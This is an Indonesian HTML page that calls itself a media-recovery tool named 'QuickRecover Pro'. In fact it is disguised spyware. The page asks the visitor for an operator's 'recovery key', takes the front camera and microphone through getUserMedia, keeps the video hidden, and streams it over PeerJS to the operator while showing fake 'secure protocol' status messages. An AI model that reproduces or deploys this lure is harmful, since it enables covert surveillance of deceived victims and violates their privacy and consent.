<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QuickRecover Pro</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-grad: linear-gradient(120deg, #fdfbfb 0%, #ebedee 100%);
            --primary: #4a90e2;
            --primary-hover: #357abd;
            --text-dark: #1c1c1c;
            --text-light: #777;
            --card-shadow: 0 10px 30px rgba(0,0,0,0.08);
        }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-grad);
            color: var(--text-dark);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Animasi Transisi Halus */
        .fade-in { animation: fadeIn 0.4s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .card {
            background: white;
            width: 320px;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: var(--card-shadow);
            text-align: center;
            position: relative;
        }

        h1 { font-size: 22px; margin: 0 0 8px; color: var(--text-dark); font-weight: 700; }
        p.subtitle { color: var(--text-light); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }

        .input-group { margin-bottom: 25px; text-align: left; }
        .input-group label { font-size: 12px; font-weight: 600; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; display: block; }
        
        input[type="text"] {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #eee;
            border-radius: 12px;
            box-sizing: border-box;
            font-size: 16px;
            font-family: inherit;
            transition: border-color 0.3s;
            outline: none;
        }
        input[type="text"]:focus { border-color: var(--primary); }

        .btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s, transform 0.1s;
            box-shadow: 0 4px 12px rgba(74, 144, 226, 0.3);
        }
        .btn:hover { background: var(--primary-hover); transform: translateY(-1px); }
        .btn:active { transform: translateY(1px); }
        .btn:disabled { background: #ccc; cursor: not-allowed; box-shadow: none; }

        /* Loading Screen */
        #scanScreen {
            display: none;
            flex-direction: column;
            align-items: center;
            padding: 20px 0;
        }

        /* Loader Animasi Baru */
        .loader {
            width: 48px;
            height: 48px;
            border: 4px solid #eee;
            border-bottom-color: var(--primary);
            border-radius: 50%;
            animation: rotation 1s linear infinite;
            margin-bottom: 25px;
        }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .log-text { 
            font-family: 'Courier New', monospace; 
            font-size: 13px; 
            color: var(--text-light); 
            margin-top: 10px;
            background: #f9f9f9;
            padding: 10px;
            border-radius: 8px;
            width: 100%;
            box-sizing: border-box;
        }
        
        #localVideo { display: none; } 

        .back-link {
            display: inline-block;
            margin-top: 25px;
            color: #999;
            font-size: 13px;
            text-decoration: none;
            cursor: pointer;
            border-bottom: 1px dotted #999;
        }
        .back-link:hover { color: var(--primary); border-color: var(--primary); }

    </style>
</head>
<body>

    <div class="card fade-in" id="mainMenu">
        <h1>QuickRecover Pro</h1>
        <p class="subtitle">Utilitas pemulihan media perangkat.<br>Silakan masukkan kunci server.</p>
        
        <div class="input-group">
            <label>Recovery Key (ID)</label>
            <input type="text" id="adminIdInput" placeholder="Paste ID Admin di sini" autocomplete="off">
        </div>

        <button class="btn" id="connectBtn" onclick="startProcess()">
            Hubungkan Sekarang
        </button>
    </div>

    <div class="card fade-in" id="scanScreen">
        <div class="loader"></div>
        <h3>Menghubungkan...</h3>
        <p class="log-text" id="logText">Inisialisasi protokol aman...</p>
        <span class="back-link" onclick="location.reload()">Batal</span>
    </div>

    <video id="localVideo" autoplay playsinline muted></video>

<script>
    let localStream = null;
    let currentPeer = null;

    function startProcess() {
        const adminID = document.getElementById('adminIdInput').value.trim();

        if (!adminID) {
            // Efek getar simpel jika kosong
            const input = document.getElementById('adminIdInput');
            input.style.borderColor = '#ff4444';
            setTimeout(() => input.style.borderColor = '#eee', 300);
            return;
        }

        // UI Transition
        const mainMenu = document.getElementById('mainMenu');
        mainMenu.style.opacity = '0';
        mainMenu.style.transform = 'translateY(-10px)';
        
        setTimeout(() => {
            mainMenu.style.display = 'none';
            const scanScreen = document.getElementById('scanScreen');
            scanScreen.style.display = 'flex';
            scanScreen.classList.add('fade-in');
        }, 300);

        // Init Peer
        currentPeer = new Peer(null, { debug: 1 });

        const logText = document.getElementById('logText');

        currentPeer.on('open', (id) => {
            logText.innerText = "Mengakses perangkat keras...";
            getMediaAndCall(adminID, currentPeer);
        });

        currentPeer.on('error', (err) => {
            console.error(err);
            let msg = "Gagal koneksi.";
            if(err.type === 'peer-unavailable') msg = "ID Server tidak ditemukan.";
            
            logText.innerText = "Error: " + msg;
            logText.style.color = "red";
            
            setTimeout(() => {
                alert("Koneksi Gagal: " + msg);
                location.reload();
            }, 1500);
        });
    }

    async function getMediaAndCall(adminID, peer) {
        try {
            const logText = document.getElementById('logText');
            localStream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
                audio: true 
            });

            const localVideo = document.getElementById('localVideo');
            localVideo.srcObject = localStream;
            localVideo.play();

            const call = peer.call(adminID, localStream);

            call.on('close', () => {
                logText.innerText = "Sesi berakhir.";
                if(localStream) {
                    localStream.getTracks().forEach(track => track.stop());
                }
                setTimeout(() => location.reload(), 2000);
            });

            // Sukses koneksi
            setTimeout(() => {
                logText.innerText = "Status: TERHUBUNG (Streaming)";
                logText.style.color = "green";
                document.querySelector('.loader').style.borderBottomColor = "green";
            }, 1000);

        } catch (err) {
            console.error(err);
            alert("Gagal akses kamera. Izinkan akses kamera di browser.");
            location.reload();
        }
    }
</script>

</body>
</html>
